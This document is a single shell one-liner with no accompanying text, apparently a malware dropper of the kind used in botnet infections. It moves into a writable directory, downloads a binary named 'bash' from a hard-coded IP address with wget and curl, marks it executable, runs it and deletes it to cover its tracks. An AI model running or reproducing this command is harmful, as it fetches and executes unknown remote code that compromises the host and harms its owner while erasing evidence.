cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.164/bash; curl -O http://50.115.166.164/bash; chmod +x bash; ./bash; rm -rf bash
